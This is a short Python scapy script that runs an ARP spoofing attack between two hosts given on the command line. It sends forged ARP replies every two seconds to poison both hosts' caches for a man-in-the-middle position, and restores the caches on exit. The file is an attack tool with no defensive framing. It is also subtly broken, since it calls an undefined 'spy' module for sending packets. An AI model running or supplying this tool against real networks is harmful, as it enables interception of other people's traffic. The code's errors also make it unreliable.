import sys
import  time
from scapy.all import ARP
from scapy.all import Ether
from optparse import OptionParser


def restore(sip,tip):
    m=get_mac(sip)
    arp=ARP(op=2,psrc=sip,pdst=tip,hwsrc=m,hwdst=get_mac(tip))
    spy.send(arp,verbose=False)


def ars(sip,tip):
    me=get_mac(tip)
    arpa=ARP(op=2,pdst=tip,psrc=sip,hwdst=me)
    spy.send(arpa,verbose=False)


def get_mac(ip):
    arpr=ARP(pdst=ip)
    ethr=Ether(dst="ff:ff:ff:ff:ff:ff")
    tp=ethr/arpr
    ans=spy.srp(tp,verbose=False,timeout=2)[0]
    ret_lst=[]
    for e in ans:
        ret_lst.append(e[1].hwsrc)
    return ret_lst[0]

if __name__ == "__main__":
    pa=OptionParser()
    pa.add_option("-f","--first",dest="first_ip",help="The first IP to spoof")
    pa.add_option("-s","--second",dest="second_ip",help="the second ip to spoof")
    opt=pa.parse_args()[0]
    try:
        pack=0
        while True:
            ars(opt.first_ip,opt.second_ip)
            ars(opt.second_ip,opt.first_ip)
            pack=pack+2
            print("\r[+] packets sent"+str(pack),end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+]bye ...\n [+]restored...")
        restore(opt.first_ip,opt.second_ip)
        restore(opt.second_ip,opt.first_ip)
